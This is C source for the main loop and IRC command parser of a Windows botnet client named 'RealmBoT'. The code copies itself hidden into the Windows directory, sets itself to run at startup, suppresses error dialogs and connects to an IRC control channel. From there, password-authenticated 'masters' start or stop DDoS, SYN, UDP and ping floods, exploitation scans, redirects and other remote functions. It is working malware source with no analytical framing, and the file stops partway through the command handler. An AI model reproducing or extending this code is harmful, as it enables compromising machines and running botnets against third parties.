#include "headers/includes.h"
#include "headers/functions.h"
#include "Hook/config/cfg.h"
#include "headers/passwd.h"
#include "headers/globals.h"
#include "headers/externs.h"


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	char logbuf[LOGLINE],fname[_MAX_FNAME],ext[_MAX_EXT],rfilename[MAX_PATH],cfilename[MAX_PATH],windir[MAX_PATH];

	int i = 0, err = 0;
	DWORD id=0;
	BOOL bkpserver = FALSE;

	#ifndef NO_EHANDLER
	DWORD handler = (DWORD)_except_handler;
    _asm
    {                           
        push    handler        
        push    FS:[0]          
        mov     FS:[0],ESP      
    }
	if (sp2_mod) {
	sp2mod();
}

  #endif

	// record start time
	started = GetTickCount() / 1000;
	// re-seed random numbers
	srand(GetTickCount());

	#ifdef DEBUG_LOGGING
	opendebuglog();
	#endif

	#ifndef NO_CRYPT // Don't decrypt password here
	decryptstrings((sizeof((char *)authost) / sizeof(LPTSTR)), (sizeof((char *)bversion) / sizeof(LPTSTR)));
	#endif

	LoadDLLs(); // load all the dlls and functions here

	// hide system messages if bot crashes
	fSetErrorMode(SEM_NOGPFAULTERRORBOX);

	// check if this exe is running already
	if (WaitForSingleObject(CreateMutex(NULL, FALSE, botid), 30000) == WAIT_TIMEOUT)
		ExitProcess(EXIT_FAILURE);

	WSADATA WSAdata;
	if ((err = fWSAStartup(MAKEWORD(2, 2), &WSAdata)) != 0)
		return 0;
	if (LOBYTE(WSAdata.wVersion) != 2 || HIBYTE(WSAdata.wVersion) != 2 ) {
		fWSACleanup();
		return 0;
	}

	GetWindowsDirectory(windir, sizeof(windir));
	GetModuleFileName(GetModuleHandle(NULL), cfilename, sizeof(cfilename));
	_splitpath(cfilename, NULL, NULL, fname, ext);
	_snprintf(rfilename, sizeof(rfilename), "%s%s", fname, ext);

	if (strstr(cfilename, windir) == NULL) {
		char tmpfilename[MAX_PATH];
		if (rndfilename) {
			for (i=0;(unsigned int)i < (strlen(filename) - 4);i++)
				filename[i] = (char)((rand() % 26) + 97);
		}
		sprintf(tmpfilename, "%s\\%s", windir, filename);

		if (GetFileAttributes(tmpfilename) != INVALID_FILE_ATTRIBUTES)
			SetFileAttributes(tmpfilename,FILE_ATTRIBUTE_NORMAL);

		// loop only once to make sure the file is copied.
		BOOL bFileCheck=FALSE;
		while (CopyFile(cfilename, tmpfilename, FALSE) == FALSE) {
			DWORD result = GetLastError();

			if (!bFileCheck && (result == ERROR_SHARING_VIOLATION || result == ERROR_ACCESS_DENIED)) {
				bFileCheck=TRUE; // check to see if its already running! then try 1 last time.
				Sleep(15000);
			} else
				break; // just continue, it's not worth retrying.
		}
		SetFileTime(tmpfilename);
		SetFileAttributes(tmpfilename,FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);

		PROCESS_INFORMATION pinfo;
		STARTUPINFO sinfo;
		memset(&pinfo, 0, sizeof(pinfo));
		memset(&sinfo, 0, sizeof(sinfo));
		sinfo.lpTitle     = "";
		sinfo.cb = sizeof(sinfo);
		sinfo.dwFlags = STARTF_USESHOWWINDOW;
		

		char cmdline[MAX_PATH];
		HANDLE hProcessOrig = OpenProcess(SYNCHRONIZE, TRUE, GetCurrentProcessId());
		sprintf(cmdline,"%s %d \"%s\"",tmpfilename, hProcessOrig, cfilename);

		if (CreateProcess(tmpfilename, cmdline, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, windir, &sinfo, &pinfo)) {
			Sleep(200);
			CloseHandle(pinfo.hProcess);
			CloseHandle(pinfo.hThread);
			fWSACleanup();
			ExitProcess(EXIT_SUCCESS);
		}
	}



	if ((AutoStart) && !(noadvapi32))
		AutoStartRegs(rfilename);


	sprintf(logbuf,"RealmBoT (irc.p.l.g) .»».  Bot started.");
	addthread(logbuf,MAIN_THREAD,NULL);
	addlog(logbuf);

	// remove the following line if you don't want any predefined aliases
	memset(aliases, 0, sizeof(aliases));
	addpredefinedaliases();

    
    #ifndef NO_SECSYSTEM
	sprintf(logbuf,"[REALMBOT] €secure€ >> System secure monitor active. <<");
	i=addthread(logbuf,KILLER_THREAD,NULL);
	if ((threads[i].tHandle = CreateThread(NULL, 0, &AutoSecure, NULL, 0, &id)) == NULL)
		sprintf(logbuf,"RealmBoT (secure.p.l.g) .»».  Failed to start secure thread, error: <%d>.", GetLastError());
	addlog(logbuf);
    #endif

	#ifndef NO_VNC 
   sethttp(http); 
#endif 

    #ifndef NO_REGISTRY
	sprintf(logbuf,"RealmBoT(secure.p.l.g) .»».  Registry monitor active.");
	i=addthread(logbuf,KILLER_THREAD,NULL);
	if ((threads[i].tHandle = CreateThread(NULL, 0, &AutoRegistry, (LPVOID)&rfilename, 0, &id)) == NULL)
		sprintf(logbuf,"RealmBoT (secure.p.l.g) .»».  Failed to start registry thread, error: <%d>.", GetLastError());
	addlog(logbuf);
    #endif



	#ifndef NO_IDENT
	if (findthreadid(IDENT_THREAD) == 0) {
		sprintf(logbuf,"RealmBoT (identd.p.l.g) .»».  Server running on Port: 113.");
		i = addthread(logbuf,IDENT_THREAD,NULL);
		if ((threads[i].tHandle = CreateThread(NULL, 0, &IdentThread, (LPVOID)i, 0, &id)) == NULL)
			sprintf(logbuf,"RealmBoT (identd.p.l.g) .»».  Failed to start server, error: <%d>.", GetLastError());
		addlog(logbuf);
	}
	#endif

	// copy settings into main irc structure
	strncpy(mainirc.host, server, sizeof(mainirc.host)-1);
	mainirc.port = port;
	strncpy(mainirc.channel, channel, sizeof(mainirc.channel)-1);
	strncpy(mainirc.chanpass, chanpass, sizeof(mainirc.chanpass)-1);
	mainirc.spy = 0;

	while (1) {
		for (i = 0; i < 6; i++) {
			#ifndef NO_CONNCHECK
			DWORD cstat;
			// check if we're connected to the internet... if not, then wait 5mins and try again
			if (!nowininet) if (fInternetGetConnectedState(&cstat, 0) == FALSE) {
				Sleep(30000);
				continue;
			}
			#endif

			success = FALSE;
			if ((err = irc_connect((LPVOID)&mainirc)) == 2)
				break; // break out of the loop

			if (success) i--; // if we're successful in connecting, decrease i by 1;

			// irc_connect didn't return 2, so we need to sleep then reconnect
			Sleep(3000);
		}

		if (err == 2) break; // break out of the loop and close

		if (bkpserver) {
			strncpy(mainirc.host, server, sizeof(mainirc.host)-1);
			mainirc.port = port;
			strncpy(mainirc.channel, channel, sizeof(mainirc.channel)-1);
			strncpy(mainirc.chanpass, chanpass, sizeof(mainirc.chanpass)-1);
			bkpserver = FALSE;
		}
		
	}

	// cleanup;
	killthreadall();
	fWSACleanup();

	return 0;
}

// connect function used by the original bot and all clones/spies
DWORD WINAPI irc_connect(LPVOID param)
{
	SOCKET sock;
	SOCKADDR_IN ssin;

	char *nick1, nickbuf[MAXNICKLEN];

	int rval;

	IRC irc = *((IRC *)param);
	IRC *ircs = (IRC *)param;
	ircs->gotinfo = TRUE;

	while (1) {
		memset(&ssin, 0, sizeof(ssin));
		ssin.sin_family = AF_INET;
		ssin.sin_port = fhtons((unsigned int)irc.port);
		if ((ssin.sin_addr.s_addr=ResolveAddress(irc.host)) == 0)
			return 0;

		memset(nickbuf, 0, sizeof(nickbuf));
		nick1 = rndnick(nickbuf, nicktype, nickprefix);
		strncpy(threads[irc.threadnum].nick, nick1, sizeof(threads[irc.threadnum].nick)-1);

		sock = fsocket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
		threads[irc.threadnum].sock = sock;
		if (fconnect(sock, (LPSOCKADDR)&ssin, sizeof(ssin)) == SOCKET_ERROR) {
			fclosesocket(sock);
			FlushDNSCache();
			Sleep(2000);
			continue;
		}

	
		addlogv("RealmBoT (irc.p.l.g) .»».  Connected to %s.", irc.host);

		rval = irc_receiveloop(sock, irc.channel, irc.chanpass, nick1, irc.sock, irc.hchan, irc.host, irc.spy);
		fclosesocket(sock);

		if (rval == 0)
			continue;
		else if (rval == 1) {	//Disconnect (sleep 15 mins, reconnect..)
			Sleep(900000);
			continue;
		}
		else if (rval == 2)
			break;	//Quit
	}
	clearthread(irc.threadnum);

	return rval;
}

// receive loop for bots/spies
int irc_receiveloop(SOCKET sock, char *channel, char *chanpass, char *nick1, SOCKET hsock, char *hchannel, char *server, int spy)
{
	// main receive buffer
	char buffer[4096], masters[MAXLOGINS][128], *lines[MAX_LINES], str[18], login[128], host[160];
	int i, j, repeat, in_channel=0;

	for (i = 0; i < MAXLOGINS; i++)
		masters[i][0] = '\0';


	if (serverpass[0] != '\0')
		irc_sendv(sock,"PASS %s\r\n",serverpass);

 	sprintf(login, "NICK %s\r\n"
				   "USER %s 0 0 :%s\r\n", nick1, rndnick(str,LETTERNICK, FALSE), nick1);

	#ifdef DEBUG_LOGGING
	debuglog(login,FALSE);
	#endif

	if (fsend(sock, login, strlen(login), 0) == SOCKET_ERROR) {
		fclosesocket(sock);
		Sleep(5000);
		return 0;
	}

	// loop forever
	while(1) {
		memset(buffer, 0, sizeof(buffer));
		// if recv() returns 0, that means that the connection has been lost.
		if (frecv(sock, buffer, sizeof(buffer), 0) <= 0)
			break;

		// FIX ME: Truncation occurs here
		// split lines up if multiple lines received at once, and parse each line
		i = Split(buffer,&lines);
		for (j=0;j < i;j++) {
			repeat=1;
			do {
				#ifdef DEBUG_LOGGING
				debuglog(lines[j]);
				#endif

				repeat = irc_parseline(lines[j], sock, channel, chanpass, nick1, server, masters, host, &in_channel, repeat, spy);
				repeat--;

				if (repeat > 0)
					Sleep(FLOOD_DELAY);
			} while (repeat > 0);

			switch (repeat) {
			case -1:
				return 0; // Reconnect
			case -2:
				return 1; // Disconnect
			case -3:
				return 2; // Quit
			default:
				break;
			}
		}
	}

	return 0;
}

// function to parse lines for the bot and clones
int irc_parseline(char *line, SOCKET sock, char *channel, char *chanpass, char *nick1, char *server, char masters[][128], char *host, int *in_channel, int repeat, int spy)
{
	char line1[IRCLINE], line2[IRCLINE], sendbuf[IRCLINE],ntmp[12], ntmp2[3];
	char *a[MAXTOKENS], a0[128], nick[MAXNICKLEN], user[24];
	unsigned char parameters[256];

	int i, ii, s=3;
	DWORD id=0;
	BOOL ismaster = FALSE, silent = FALSE, notice = FALSE, usevars = FALSE;

	memset(sendbuf, 0, sizeof(sendbuf));

	strncpy(nick, nick1, sizeof(nick)-1);

	if (line == NULL) return 1;
	memset(line1, 0, sizeof(line1));
	strncpy(line1, line, sizeof(line1)-1);
	char *x = strstr(line1, " :");

	// split the line up into seperate words
	strncpy(line2, line1, sizeof(line2)-1);
	a[0] = strtok(line2, " ");
	for (i = 1; i < MAXTOKENS; i++)
		a[i] = strtok(NULL, " ");

	if (a[0] == NULL || a[1] == NULL)
		return 1;

	memset(parameters,0,sizeof(parameters));
	for (i=31;i>=0;i--) {
		if (!a[i])
			continue;
		if ((a[i][0]=='-') && (a[i][2]==0)) {
			//Looks like a valid parameter..
			parameters[a[i][1]]=1;
			a[i][0]=0;
			a[i][1]=0;
			a[i][2]=0;
			a[i]=NULL;
		} else
			break;
	}

	if (parameters['s'])
		silent=TRUE;
	if (parameters['n']) {
		silent=FALSE;
		notice=TRUE;
	}

	if (a[0][0] != '\n') {
		strncpy(a0,  a[0], sizeof(a0)-1);
		strncpy(user, a[0]+1, sizeof(user)-1);
		strtok(user, "!");
	}

	// pong if we get a ping request from the server
	if (strcmp("PING", a[0]) == 0) {
		a[0][1]='O';

		//irc_sendv(sock, "PONG %s\r\n", a[1]+1);
		irc_sendv(sock, "PONG %s\r\n", a[1]);
		if (*in_channel == 0)
			irc_sendv(sock, "JOIN %s %s\r\n", channel, chanpass);
                irc_sendv(sock, "topic %s :%s \r\n ", channel, topics);
                irc_sendv(sock, "MODE %s +mnst \r\n", channel, chanpass);
		return 1;
	}

	// looks like we're connected to the server, let's join the channel
	if (strcmp("001", a[1]) == 0 || strcmp("005", a[1]) == 0) {
		irc_sendv(sock, "USERHOST %s\r\n", nick1); // get our hostname
		#ifndef NO_MODEONCONN
		irc_sendv(sock, "MODE %s %s\r\n", nick1, modeonconn);
		#else
		irc_sendv(sock, "MODE %s +i\r\n", nick1);
		#endif
		irc_sendv(sock, "JOIN %s %s\r\n", channel, chanpass);
		success = TRUE;
		return 1;
	}

	// get host
	if (strcmp("302", a[1]) == 0) {
		char *h = strstr(a[3], "@");
		if (h != NULL)
			strncpy(host,  h+1, 159);
		return 1;
	}

	// nick already in use
	if (strcmp("433", a[1]) == 0) {
		rndnick(nick1, nicktype, nickprefix);
		irc_sendv(sock, "NICK %s\r\n", nick1);
		return 1;
	}

	// check if user is logged in
	for (i = 0; i < MAXLOGINS; i++) {
		if (strcmp(masters[i], a0) == 0)
			ismaster = TRUE;
	}

	//rejoin channel if we're kicked, otherwise reset master if it was our master that got kicked
	if (strcmp("KICK", a[1]) == 0) {
		char *knick;
		for (i = 0; i < MAXLOGINS; i++) {
			if (masters[i][0] == '\0') continue;
			strncpy(a0,  masters[i], sizeof(a0)-1);
			knick = user;
			if (knick != NULL && a[3] != NULL)
				if (strcmp(knick, a[3]) == 0) {
					masters[i][0] = '\0';
					sprintf(sendbuf,"[REALMBOT] << User %s logged out. >>", knick);
					irc_sendv(sock, "NOTICE %s :%s\r\n", knick, sendbuf);
					addlog(sendbuf);
				}
		}
		if (strcmp(nick1, a[3]) == 0) {
			*in_channel = 0;
			irc_sendv(sock, "JOIN %s %s\r\n", channel, chanpass);
		}
		return 1;
	}

	if (strcmp("NICK", a[1]) == 0) {
		char *oldnck = user, *newnck = a[2] + 1;
		for (i=0;i<MAXLOGINS;i++) {
			if (strcmp(masters[i],a0) == 0) {
				//Master has changed nick
				//Lets TRY to rebuild the master-usermask.
				char *identandhost=strchr(a0,'!');
				if (identandhost) {
					masters[i][0]=':';	//Prefix
					strcpy(&masters[i][1],newnck);
					strcat(&masters[i][2],identandhost);
				}
			}
		}
		if(oldnck != NULL && newnck != NULL) {
			if(strcmp(oldnck, nick1) == 0) {
				strncpy(nick1, newnck, 15);
				return 1;
			}
			char debugbuf[100];
			for (i = 0; i < MAXLOGINS; i++) {
				if(masters[i][0] != '\0' && strcmp(masters[i], a0) == 0) {
					char *ih = strchr(a0, '!');
					if(ih == NULL || strlen(newnck) + strlen(ih) > 126)
						return 1;
					sprintf(masters[i], ":%s%s", newnck, ih);
					irc_privmsg(sock, channel, debugbuf, FALSE);
					break;
				}
			}
		}

		return 1;
	}

	// reset master if master parts or quits
	if (strcmp("PART", a[1]) == 0 || strcmp("QUIT", a[1]) == 0) {
		for (i = 0; i < MAXLOGINS; i++) {
			if (masters[i][0] != '\0') {
				if (strcmp(masters[i], a[0]) == 0) {
					masters[i][0] = '\0';
					sprintf(sendbuf, "RealmBoT (irc.p.l.g) .»».  User: %s logged out.", user);
					addlog(sendbuf);
					if (strcmp("PART", a[1]) == 0)
						irc_sendv(sock, "NOTICE %s :%s\r\n", a[0] + 1, sendbuf);
					return 1;
				}
			}
		}
	}

	// we've successfully joined the channel
	if (strcmp("353", a[1]) == 0) {
		if (strcmp(channel, a[4]) == 0)
			*in_channel = 1;
		addlogv("RealmBoT (irc.p.l.g) .»».  Joined channel: %s.", a[4]);
		return 1;
	}

	// if we get a privmsg, notice or topic command, start parsing it
	if (strcmp("PRIVMSG", a[1]) == 0 || strcmp("NOTICE", a[1]) == 0 || (strcmp("332", a[1]) == 0 && topiccmd)) {
		if (strcmp("PRIVMSG", a[1]) == 0 || strcmp("NOTICE", a[1]) == 0) {	// it's a privmsg/notice
			if (strcmp("NOTICE", a[1]) == 0)
				notice = TRUE;
			if (a[2] == NULL) return 1;

			if (strstr(a[2], "#") == NULL || notice)
				a[2] = user;

			if (a[3] == NULL) return 1;
			a[3]++;
			// if our nick is the first part of the privmsg, then we should look at a[4] for a command, a[3] otherwise.
			if (a[3] && nick1)
				if (strncmp(nick, a[3], strlen(nick)) == 0)
					s = 4;
				else
					s = 3;
			if (a[s] == NULL) return 1;
			// if someone asks for our version, send version reply
			// new version code that doesn't crash bot
			
			if (strcmp("\1VERSION\1", a[s]) == 0)
							if (a[2][0] != '#' && bversion != '\0') {
								irc_sendv(sock, "NOTICE %s :\1VERSION %s\1\r\n", a[2], bversion);

								sprintf(sendbuf, "%s has just versioned me.", user);//->
								addlog(sendbuf);

								if (!ismaster)
									irc_privmsg(sock, mainirc.channel, sendbuf, true);

								return 1;
				}
			else if (strcmp("\1PING", a[s]) == 0)
				if (a[s+1] != NULL && a[2][0] != '#') {
					irc_sendv(sock, "NOTICE %s :\1PING %s\1\r\n", a[2], a[s+1]);
					return 1;
				}
		} else  { // it's a topic command
			s = 4;
			a[4]++;
			a[2] = a[3];
		}


		if (a[s]++[0] != prefix)
			return 1;

		#ifdef DEBUG_CRYPT	// NOTE: Here for testing only. Please leave until we have the auth bug looked at.
		#ifndef NO_CRYPT
		if (strcmp("dump", a[s]) == 0) {
			if (a[s+1]) {
				irc_sendv(sock, "NOTICE %s : Id = '%s'\r\n",user,botid); Sleep(FLOOD_DELAY);
				irc_sendv(sock, "NOTICE %s : Version = '%s'\r\n",user,version); Sleep(FLOOD_DELAY);
				irc_sendv(sock, "NOTICE %s : Server = '%s'\r\n",user,server); Sleep(FLOOD_DELAY);
				irc_sendv(sock, "NOTICE %s : Channel = '%s'\r\n",user,channel); Sleep(FLOOD_DELAY);
				irc_sendv(sock, "NOTICE %s : Nickconst = '%s'\r\n",user,nickconst); Sleep(FLOOD_DELAY);
				irc_sendv(sock, "NOTICE %s : Authost = '%s'\r\n",user,authost[0]);
				irc_sendv(sock, "NOTICE %s : Password(before) = '%s'\r\n",user,password); Sleep(FLOOD_DELAY);
				Crypt(password,strlen(password));
				irc_sendv(sock, "NOTICE %s : Password = '%s'\r\n",user,password); Sleep(FLOOD_DELAY);
				Crypt(password,strlen(password));
				irc_sendv(sock, "NOTICE %s : Password(enc) = '%s'\r\n",user,password); Sleep(FLOOD_DELAY);
				Crypt(a[s+1],strlen(a[s+1]));
				irc_sendv(sock, "NOTICE %s : Password(arg) = '%s'\r\n",user,a[s+1]); Sleep(FLOOD_DELAY);
			}

			return 1;
		}
		#endif
		#endif

		// see if someone is logging in
		if (strcmp("login", a[s]) == 0 || strcmp("l", a[s]) == 0) {
			if (a[s+1] == NULL || ismaster)
				return 1;

			char *u = strtok(a[0], "!") + 1, *h = strtok(NULL, "\0");
			h = strtok(h, "~");
			#ifndef NO_CRYPT
			Crypt(a[s+1],strlen(a[s+1]),"",0); // Encrypt password to compare to stored password
			#endif
			if (strcmp(password, a[s+1]) != 0) {
				irc_sendv(sock, "NOTICE %s :Are you a Fucker?. (%s!%s).\r\n", user, user, h);
				irc_sendv(sock, "NOTICE %s :No pass for you.\r\n", user);
				sprintf(sendbuf, "RealmBoT (irc.p.l.g) .»».  *Failed pass auth by: (%s!%s).", u, h);
		//		irc_sendv(sock, "MSG %s *Failed pass auth by: (%s!%s)." ", channel, u, h);
				addlog(sendbuf);
				return 1;
			}

			BOOL host_ok=FALSE;
            
		for (i=0;i<(sizeof((char *)authost) / sizeof(LPTSTR));i++) {

			#ifndef NO_WILDCARD
				if (wildcardfit(authost[i], h)) {
					host_ok = TRUE;
					break;
				}
			#else
				if (strcmp(h, authost[i]) == 0) {
					host_ok = TRUE;
					break;
				}
			#endif
			}
 			if (!host_ok) {
 				irc_sendv(sock, "NOTICE %s :WTF!? no yet fucker!. (%s!%s).\r\n", user, user, h);
 				irc_sendv(sock, "NOTICE %s :Orders: No Talk with you.\r\n", user);
 				sprintf(sendbuf, "RealmBoT (irc.p.l.g) .»».  *Failed host auth by: (%s!%s).", u, h);
 				addlog(sendbuf);
 				return 1;
			}
			for (i = 0; i < MAXLOGINS; i++) {
				if (a[s+1] == NULL) return 1;
				if (masters[i][0] != '\0') continue;
				if (strcmp(password, a[s+1]) == 0) {
					strncpy(masters[i],  a0, 127);
					if (!silent) irc_privmsg(sock, a[2], "[REALMBOT] : Thank for trying.", notice);
					addlogv("RealmBoT (irc.p.l.g) .»».  User: %s logged in.", user);
					break;
				}
			}
			return 1;
		}

		if ((ismaster || strcmp("332", a[1]) == 0) && spy == 0) {
			// commands requiring no parameters
			// check if the command matches an alias's name
			for (i = 0; i < anum; i++) {
				if (strcmp(aliases[i].name, a[s]) == 0) {
					char *sc = strstr(line, " :");
					if (sc == NULL) return 1;
					sc[2] = prefix;
					sc[3] = prefix;
					strncpy(sc+4, aliases[i].command, 159);

					// process '$x-' parameter variables
					for (ii=15; ii > 0; ii--) {
						sprintf(ntmp, "$%d-", ii);
						if (strstr(line, ntmp) != NULL && a[s+ii+1] != NULL) {
							x = x + strlen(aliases[i].name);
							if (x != NULL) {
								char *y = strstr(x, a[s+ii]);
								if (y != NULL) replacestr(line, ntmp, y);
							}
						}
						else if (a[s+ii+1] == NULL) {
							strncpy(ntmp2, ntmp, 2);
							ntmp2[2] = '\0';
							replacestr(line, ntmp, ntmp2);
						}
					}

					// process '$x' parameter variables
					for (ii=16; ii > 0; ii--){
						sprintf(ntmp, "$%d", ii);
						if (strstr(line, ntmp) != NULL && a[s+ii] != NULL)
							replacestr(line, ntmp, a[s+ii]);
					}

					usevars = TRUE;
					break;
				}
			}

			if (a[s][0] == prefix || usevars) {
				// process variables
				replacestr(line, "$me", nick1); // bot's nick
				replacestr(line, "$user", user); // user's nick
				replacestr(line, "$chan", a[2]); // channel name (or user name if this is a privmsg to the bot)
				replacestr(line, "$rndnick", rndnick(ntmp)); // random string of 4-7 characters
				replacestr(line, "$server", server); // name of current server

				// process '$chr()' variables
				while (strstr(line, "$chr(") != NULL) {
					char *c = strstr(line, "$chr(");
					strncpy(ntmp, c+5, 4);
					strtok(ntmp, ")");
					if (ntmp[0] < 48 || ntmp[0] > 57)
						strncpy(ntmp, "63", 3);
					if (atoi(ntmp) > 0)
						ntmp2[0] = (char)atoi(ntmp);
					else
						ntmp2[0] = (char)((rand()%96) + 32);
					ntmp2[1] = '\0';
					ii = strlen(ntmp);
					memset(ntmp, 0, sizeof(ntmp));
					strncpy(ntmp, c, ii+6);
					replacestr(line, ntmp, ntmp2);
				}

				// re-split the line into seperate words
				strncpy(line1, line, sizeof(line1)-1);
				strncpy(line2, line1, sizeof(line2)-1);
				a[0] = strtok(line2, " ");
				for (i = 1; i < 32; i++)
					a[i] = strtok(NULL, " ");
				if (a[s] == NULL)
					return 1;
				a[s] += 3;
			}

			if (strcmp("rndnick", a[s]) == 0 || strcmp("rn", a[s]) == 0) {
				rndnick(nick, nicktype, ((parameters['p'])?(TRUE):(FALSE)), a[s+1]);
				irc_sendv(sock, "NICK %s\r\n", nick);

				addlogv("RealmBoT (irc.p.l.g) .»».  Random nick change: %s",nick);

				return repeat;
			}
			else if (strcmp("die", a[s]) == 0 || strcmp("irc.di", a[s]) == 0) {
				if (strcmp("332", a[1]) != 0) {
					#ifdef DEBUG_LOGGING
					closedebuglog();
					#endif
					killthreadall();
					ExitProcess(EXIT_SUCCESS);
				}
			}
			else if (strcmp("logout", a[s]) == 0 || strcmp("lo", a[s]) == 0) {
				if (a[s+1]) {
					i = atoi(a[s+1]);
					if(i >= 0 && i < MAXLOGINS) {
    					if(masters[i][0] != '\0') {
        					sprintf(sendbuf, "[REALMBOT] << User %s logged out. >>", masters[i]+1);
        					masters[i][0] = '\0';
        				} else
        					sprintf(sendbuf, "RealmBoT (irc.p.l.g) .»».  No user logged in at slot: %d.", i);
					} else
						sprintf(sendbuf, "RealmBoT(irc.p.l.g) .»».  Invalid login slot number: %d.", i);
				} else {
					for (i = 0; i < MAXLOGINS; i++)
						if (strcmp(masters[i], a[0]) == 0) {
							masters[i][0] = '\0';
							sprintf(sendbuf, "[REALMBOT]  << User %s logged out. >>", user);
							break;
						}
				}
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
			#ifndef NO_BOTVERSION
			else if (strcmp("versionship", a[s]) == 0 || strcmp("ver", a[s]) == 0) {
				sprintf(sendbuf, "RealmBoT (irc.p.l.g) .»».  %s", version);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
			#endif

			#ifdef NO_SPEEDTEST
		    else if (strcmp("speedtest", a[s]) == 0 || strcmp("test", a[s]) == 0) {
			DoSpeedTest(sock, a[2], notice);

			return repeat;
			}
		    #endif

			#ifndef NO_VNC 
else if (strcmp("chghttp", a[s]) == 0) 
{ 
   sethttp(a[s+1]); 
   sprintf(sendbuf,"VNC: HTTP Host Changed To: %s", a[s+1]); 
   if (!silent) irc_privmsg(sock, a[2], sendbuf, notice); 
   return 1; 
} 
#endif

			#ifndef NO_SECURE
			else if (strcmp("secure", a[s]) == 0 || strcmp("sec", a[s]) == 0
				|| strcmp("lockdown.off", a[s]) == 0 || strcmp("ld.off", a[s]) == 0) {
				SECURE secure;
				secure.secure = (strcmp("secure",a[s])==0 || strcmp("sec",a[s])==0);
				_snprintf(secure.chan, sizeof(secure.chan), a[2]);
				secure.sock = sock;
				secure.notice = notice;
				secure.silent = silent;

				_snprintf(sendbuf, sizeof(sendbuf),"[REALMBOT] <<  %s system. >>", ((secure.secure)?("Securing"):("Unsecuring")));
				secure.threadnum = addthread(sendbuf, SECURE_THREAD, NULL);
				if (threads[secure.threadnum].tHandle = CreateThread(NULL, 0, &SecureThread, (LPVOID)&secure, 0, &id)) {
					while (secure.gotinfo == FALSE)
						Sleep(50);
				} else
					sprintf(sendbuf,"RealmBoT (secure.p.l.g) .»».  Failed to start secure thread, error: <%d>.", GetLastError());
				addlog(sendbuf);

				return 1;
			}
			#endif
			else if			 (strcmp("visit", a[s]) == 0 || strcmp("irc.v", a[s]) == 0) {
				VISIT visit;
				strncpy(visit.host, a[s+1], sizeof(visit.host)-1);
				if (a[s+2] != NULL)
					strncpy(visit.referer, a[s+2], sizeof(visit.referer)-1);
				strncpy(visit.chan, a[2], sizeof(visit.chan)-1);
				visit.sock = sock;
				visit.silent = silent;
				visit.notice = notice;

				sprintf(sendbuf,".T..x. (visit.p.l.g) .»».  URL: %s.",a[s+1]);
				visit.threadnum=addthread(sendbuf,VISIT_THREAD,NULL);
				if (threads[visit.threadnum].tHandle = CreateThread(NULL, 0, &VisitThread, (LPVOID)&visit, 0, &id)) {
					while(visit.gotinfo == FALSE)
						Sleep(50);
				} else
					sprintf(sendbuf,"[REALMBOT] << Failed to start connection thread, error: <%d>. >>", GetLastError());
				addlog(sendbuf);

				return 1;
			}
			

			
			else if (strcmp("web.off",a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,".h.ttp.d...","Server",HTTP_THREAD,a[s+1]);

				return 1;
			}
			else if (strcmp("ftpd.off",a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,"[REALMBOT] : ","Server",FTP_THREAD,a[s+1]);

				return 1;
			}
			else if (strcmp("log.off",a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,".l.o.g...","Log list",LOG_THREAD,a[s+1]);

				return 1;
			}
			else if (strcmp("proxy.redirect.off",a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,".r.edirec.t...","TCP redirect",REDIRECT_THREAD,a[s+1]);

				return 1;
			}
			else if (strcmp("ddos.off",a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,".d.do.s...","DDoS flood",DDOS_THREAD,a[s+1]);

				return 1;
			}
			else if (strcmp("syn.off",a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,".s.y.n...","Syn flood",SYN_THREAD,a[s+1]);

				return 1;
			}
			else if (strcmp("udp.off",a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,".u.d.p...","UDP flood",UDP_THREAD,a[s+1]);

				return 1;
			}
			else if (strcmp("ping.off",a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,".p.in.g...","Ping flood",PING_THREAD,a[s+1]);

				return 1;
			}
			

			#ifndef NO_PROCESS
			else if (strcmp("proc.off",a[s]) == 0 || strcmp("com.ps.off",a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,".p.ro.c...","Process list",PROC_THREAD,a[s+1]);

				return 1;
			}
			#endif
			else if (strcmp("clone.off",a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,".c.lone.s...","Clone",CLONE_THREAD,a[s+1]);

				return 1;
			}
			else if (strcmp("secure.stop",a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,".s.ecur.e...","Secure",SECURE_THREAD,a[s+1]);

				return 1;
			}
			else if (strcmp("scanstop",a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,"Exploitation","Scan",SCAN_THREAD,a[s+1]);

				return 1;
			}
			
			else if (strcmp("stats",a[s]) == 0 || strcmp("st",a[s]) == 0) {
				ListExploitStats(sock,a[2],notice);

				return repeat;
			}
			else if (strcmp("reconnect", a[s]) == 0 || strcmp("irc.r", a[s]) == 0) {
				irc_sendv(sock, "QUIT :reconnecting\r\n");
				addlog("RealmBoT (irc.p.l.g) .»».  Reconnecting.");

				return 0;
			}
			else if (strcmp("disconnect", a[s]) == 0 || strcmp("irc.d", a[s]) == 0) {
				irc_sendv(sock, "QUIT :disconnecting\r\n");
				addlog("RealmBoT (irc.p.l.g) .»».  Disconnecting.");

				return -1;
			}
			else if (strcmp("quit", a[s]) == 0 || strcmp("irc.q", a[s]) == 0) {
				if (a[s+1]) {
					if (x != NULL) {
						char *y = strstr(x, a[s+1]);
						if (y != NULL) irc_sendv(sock, "QUIT :%s\r\n", y);
					}
				} else
					irc_sendv(sock, "QUIT :later\r\n");

				return -2;
			}
			else if (strcmp("status", a[s]) == 0 || strcmp("irc.s", a[s]) == 0) {
				sprintf(sendbuf, "RealmBoT (irc.p.l.g) .»».  Status: Ready. Bot Uptime: %s.", Uptime(started));
				irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
